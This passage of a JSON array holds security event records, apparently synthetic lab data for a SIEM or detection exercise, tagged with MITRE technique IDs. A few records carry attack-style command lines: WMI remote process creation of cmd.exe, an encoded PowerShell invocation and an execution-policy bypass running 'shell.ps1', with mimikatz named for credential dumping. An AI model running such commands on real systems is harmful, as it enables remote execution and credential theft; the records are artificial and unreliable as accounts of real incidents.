    "MitreTechnique": "T1047",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": "wmic /node:TARGET process call create cmd.exe",
    "ProcessName": "wmiprvse.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T03:41:37.668648",
    "EventType": "Firewall Block",
    "Severity": "Low",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "91.234.56.78",
    "DestinationIP": "172.16.0.100",
    "MitreTechnique": null,
    "LogSource": "Firewall / UFW",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T02:27:37.661192",
    "EventType": "Successful Login",
    "Severity": "Info",
    "EventCode": 4624,
    "UserAccount": "svc.splunk",
    "Computer": "FIN-SERVER-01",
    "SourceIP": "172.16.0.100",
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T11:31:37.661692",
    "EventType": "Brute Force Attempt",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "lab.administrator",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": "192.168.56.105",
    "MitreTechnique": "T1110.001",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-23T07:34:37.666341",
    "EventType": "C2 Outbound Connection",
    "Severity": "Critical",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": "185.220.101.45",
    "MitreTechnique": "T1071.001",
    "LogSource": "Firewall / Sysmon",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T13:00:37.662800",
    "EventType": "Kerberos TGS Request",
    "Severity": "High",
    "EventCode": 4769,
    "UserAccount": "john.doe",
    "Computer": "WIN-DC-PRAHARSH",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1558.003",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T22:49:37.666658",
    "EventType": "DNS Tunneling Detected",
    "Severity": "Critical",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "WAZUH-MANAGER-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1071.004",
    "LogSource": "DNS / Zeek",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T12:18:37.662633",
    "EventType": "SSH Brute Force",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": "splunk",
    "Computer": "SPLUNK-VM-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.001",
    "LogSource": "Linux Auth",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-23T19:35:37.669186",
    "EventType": "Phishing Email",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1566.001",
    "LogSource": "Email Gateway",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-19T16:29:37.665937",
    "EventType": "WMI Remote Execution",
    "Severity": "High",
    "EventCode": 1,
    "UserAccount": "svc.backup",
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1047",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": "wmic /node:TARGET process call create cmd.exe",
    "ProcessName": "wmiprvse.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T15:58:37.668834",
    "EventType": "IDS Alert",
    "Severity": "Medium",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "192.168.56.101",
    "DestinationIP": "23.129.64.100",
    "MitreTechnique": null,
    "LogSource": "Suricata / Snort",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T09:02:37.669167",
    "EventType": "Phishing Email",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1566.001",
    "LogSource": "Email Gateway",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T13:38:37.661796",
    "EventType": "RDP Brute Force",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "dev.engineer",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.003",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra / CrackMapExec"
  },
  {
    "TimeGenerated": "2026-04-21T06:02:37.666254",
    "EventType": "C2 Outbound Connection",
    "Severity": "Critical",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": "185.220.101.45",
    "MitreTechnique": "T1071.001",
    "LogSource": "Firewall / Sysmon",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T03:19:37.662952",
    "EventType": "Password Spray",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "temp.analyst",
    "Computer": "WIN-DC-PRAHARSH",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.003",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T07:55:37.665571",
    "EventType": "RDP Login",
    "Severity": "Medium",
    "EventCode": 4624,
    "UserAccount": "dev.engineer",
    "Computer": null,
    "SourceIP": "192.168.56.101",
    "DestinationIP": null,
    "MitreTechnique": "T1021.001",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T01:25:37.665467",
    "EventType": "RDP Login",
    "Severity": "Medium",
    "EventCode": 4624,
    "UserAccount": "temp.analyst",
    "Computer": null,
    "SourceIP": "192.168.56.103",
    "DestinationIP": null,
    "MitreTechnique": "T1021.001",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T22:29:37.667063",
    "EventType": "Credential Dumping",
    "Severity": "Critical",
    "EventCode": 10,
    "UserAccount": "praharsh.admin",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1003.001",
    "LogSource": "Sysmon Event ID 10",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": "comsvcs.dll",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T09:56:37.660726",
    "EventType": "Successful Login",
    "Severity": "Info",
    "EventCode": 4624,
    "UserAccount": "praharsh.admin",
    "Computer": "WAZUH-MANAGER-01",
    "SourceIP": "10.0.2.15",
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T11:02:37.668633",
    "EventType": "Firewall Block",
    "Severity": "Low",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "23.129.64.100",
    "DestinationIP": "10.0.2.15",
    "MitreTechnique": null,
    "LogSource": "Firewall / UFW",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T04:04:37.662933",
    "EventType": "Password Spray",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "svc.splunk",
    "Computer": "WIN-DC-PRAHARSH",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.003",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T06:31:37.669236",
    "EventType": "Phishing Email",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1566.001",
    "LogSource": "Email Gateway",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T08:00:37.662702",
    "EventType": "SSH Brute Force",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": "splunk",
    "Computer": "SPLUNK-VM-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.001",
    "LogSource": "Linux Auth",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-22T02:57:37.667603",
    "EventType": "Process Injection",
    "Severity": "Critical",
    "EventCode": 8,
    "UserAccount": null,
    "Computer": "FIN-SERVER-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1055",
    "LogSource": "Sysmon Event ID 8",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T07:12:37.661707",
    "EventType": "Brute Force Attempt",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "lab.administrator",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": "192.168.56.105",
    "MitreTechnique": "T1110.001",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-20T01:50:37.667658",
    "EventType": "Process Injection",
    "Severity": "Critical",
    "EventCode": 8,
    "UserAccount": null,
    "Computer": "SPLUNK-VM-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1055",
    "LogSource": "Sysmon Event ID 8",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T19:10:37.660611",
    "EventType": "Successful Login",
    "Severity": "Info",
    "EventCode": 4624,
    "UserAccount": "praharsh.admin",
    "Computer": "WAZUH-MANAGER-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T05:51:37.663901",
    "EventType": "Sysmon File Create",
    "Severity": "Medium",
    "EventCode": 11,
    "UserAccount": "dev.engineer",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1105",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": "msiexec.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T02:24:37.664699",
    "EventType": "PowerShell Execution",
    "Severity": "High",
    "EventCode": 4104,
    "UserAccount": "dev.engineer",
    "Computer": "SPLUNK-VM-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1059.001",
    "LogSource": "Windows PowerShell",
    "IsLabAttack": false,
    "CommandLine": "powershell.exe -enc SQBFAFgA",
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T01:39:37.664459",
    "EventType": "PowerShell Execution",
    "Severity": "High",
    "EventCode": 4104,
    "UserAccount": "praharsh.admin",
    "Computer": "DEV-SERVER-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1059.001",
    "LogSource": "Windows PowerShell",
    "IsLabAttack": false,
    "CommandLine": "powershell.exe -ep bypass -file C:\\shell.ps1",
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T06:48:37.660648",
    "EventType": "Successful Login",
    "Severity": "Info",
    "EventCode": 4624,
    "UserAccount": "dev.engineer",
    "Computer": "SPLUNK-VM-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T12:13:37.667059",
    "EventType": "Credential Dumping",
    "Severity": "Critical",
    "EventCode": 10,
    "UserAccount": "john.doe",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1003.001",
    "LogSource": "Sysmon Event ID 10",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": "mimikatz.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T01:49:37.668185",
    "EventType": "Firewall Block",
    "Severity": "Low",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "192.168.56.104",
    "DestinationIP": "192.168.56.101",
    "MitreTechnique": null,
    "LogSource": "Firewall / UFW",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T01:19:37.665711",
    "EventType": "RDP Login",
    "Severity": "Medium",
    "EventCode": 4624,
    "UserAccount": "praharsh.admin",
    "Computer": null,
    "SourceIP": "172.16.0.100",
    "DestinationIP": null,
    "MitreTechnique": "T1021.001",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T08:03:37.666534",
    "EventType": "DNS Tunneling Detected",
    "Severity": "Critical",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "ELK-SERVER-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1071.004",
    "LogSource": "DNS / Zeek",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T07:16:37.663492",
    "EventType": "Sysmon Network Connection",
    "Severity": "Medium",
    "EventCode": 3,
    "UserAccount": "praharsh.admin",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": "194.165.16.11",
    "MitreTechnique": "T1071.001",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": "wscript.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T04:27:37.667631",
    "EventType": "Process Injection",
    "Severity": "Critical",
    "EventCode": 8,
    "UserAccount": null,
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1055",
    "LogSource": "Sysmon Event ID 8",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T11:05:37.665225",
    "EventType": "Port Scan Detected",
    "Severity": "Medium",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1046",
    "LogSource": "Firewall / IDS",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Nmap"
  },
  {
    "TimeGenerated": "2026-04-24T00:49:37.667842",
    "EventType": "Cloud IAM Change",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": "temp.analyst",
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1098",
    "LogSource": "CloudTrail / Azure AD",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T21:01:37.661655",
    "EventType": "Brute Force Attempt",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "lab.administrator",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": "192.168.56.105",
    "MitreTechnique": "T1110.001",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
